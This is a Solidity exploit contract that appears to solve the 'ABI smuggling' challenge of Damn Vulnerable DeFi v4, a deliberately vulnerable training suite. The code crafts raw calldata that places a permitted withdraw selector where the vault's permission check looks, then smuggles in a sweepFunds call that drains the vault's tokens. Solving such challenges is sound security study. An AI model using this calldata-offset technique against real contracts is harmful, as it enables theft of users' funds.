// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";


contract Attack {
    SelfAuthorizedVault public vault;
    IERC20 public token;
    address public player;
    address public recovery;

    // Events declaration for loggings
    event LogExecuteSelector(bytes executeSelector);
    event LogTargetAddress(bytes target);
    event LogDataOffset(bytes logDataOffset);
    event LogEmptyData(bytes logEmptyData);
    event LogWithdrawSelectorPadded(bytes withdrawSelectorPadded);
    event LogActionDataLength(uint actionDataLength);
    event LogSweepFundsCallData(bytes SweepFundsCallData);
    event LogCallDataPayLoad(bytes calldataPayLoad);

    constructor (
        address _vault,
        address _token,
        address _recovery
    ) {
        vault = SelfAuthorizedVault(_vault);
        token = IERC20(_token);
        recovery = _recovery;
        player = msg.sender;
    }

 
    function executeAttack() external returns (bytes memory) 
    {
        require(msg.sender == player, "Only player can execute exploit");

        // execute function selector
        bytes4 executeSelector = vault.execute.selector;
        // Constructing the target vault address 
        bytes memory target = abi.encodePacked(bytes12(0), address(vault));
        // Construct the calldata start location offset
        bytes memory offSetData = abi.encodePacked(uint256(0x80));
        // Construct the empty data filler
        bytes memory emptyData = abi.encodePacked(uint256(0));
        //
        bytes memory selectorPadded = abi.encodePacked(bytes4(0xd9caed12), bytes28(0));

        // calldata for `sweepFund` function 
        bytes memory sweepFundsCalldata = abi.encodeWithSelector(vault.sweepFunds.selector, recovery, token);

        uint256 actionDataLengthVal = sweepFundsCalldata.length;
        emit LogActionDataLength(actionDataLengthVal);

        bytes memory actionDataLength = abi.encodePacked(uint256(actionDataLengthVal));

        // Combining bits & parts for a combined attack
        bytes memory calldatapayLoad = abi.encodePacked(
            executeSelector,
            target,
            offSetData,
            emptyData,
            selectorPadded,
            actionDataLength,
            sweepFundsCalldata
        );

        emit LogCallDataPayLoad(calldatapayLoad);

        return calldatapayLoad;
    }
} 